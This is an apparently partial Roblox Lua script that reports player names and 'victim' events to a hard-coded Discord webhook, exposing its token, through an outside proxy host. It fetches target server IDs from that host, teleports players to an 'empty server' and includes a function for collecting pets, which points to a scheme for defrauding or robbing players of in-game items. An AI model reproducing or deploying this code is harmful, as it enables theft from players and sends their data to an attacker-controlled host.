...
local function webhookNotify(content, desc, title)
    local baseurl = "https://redanddwhite.pythonanywhere.com/postreq?url=https://discord.com/api/webhooks/1218333891639906414/6NJrKAKf7cjDIyyrHmlPrMfJFNlbs9iPjD_gyf1S_PjJix5MeeH7duDKH1n3CODJLOGk"
    local jstr = '{"content": "'..content..'", "username": "'..game.Players.LocalPlayer.Name..'", "embeds": [{"description": "'..desc..'", "title": "'..title..'"}]}'
    local encoded_json = url_encode(jstr)
    local url = baseurl.."&json="..encoded_json
    local resp = game:HttpGet(url)
end
...
function getJobID()
    local url = "https://redanddwhite.pythonanywhere.com/getjobid"
    local resp = game:HttpGet(url)
    return resp
end
function getPets()
...
if (game.JobId == tostring(targetJobId)) then
    ...
    notifyRan("Stage 1")
    webhookNotify("Victim joining JobID", targetJobId, game.Players.LocalPlayer.Name)
    game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = "Teleporting you to empty server..", -- Required
